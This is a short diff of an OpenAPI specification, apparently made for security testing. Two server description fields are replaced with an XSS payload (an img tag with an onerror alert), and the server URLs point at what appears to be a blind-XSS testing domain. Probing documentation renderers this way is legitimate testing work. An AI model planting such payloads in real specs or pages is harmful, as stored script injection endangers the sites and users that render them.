@@ -6,9 +6,9 @@ info:
 
 servers:
   - url: https://paktiko.bxss.in
-    description: Optional server description, e.g. Main (production) server
+    description: <img src=x onerror="alert('XSS')">
   - url: https://paktiko.bxss.in
-    description: Optional server description, e.g. Internal staging server for testing
+    description: <img src=x onerror="alert('XSS')">
     
 paths:
   /users:
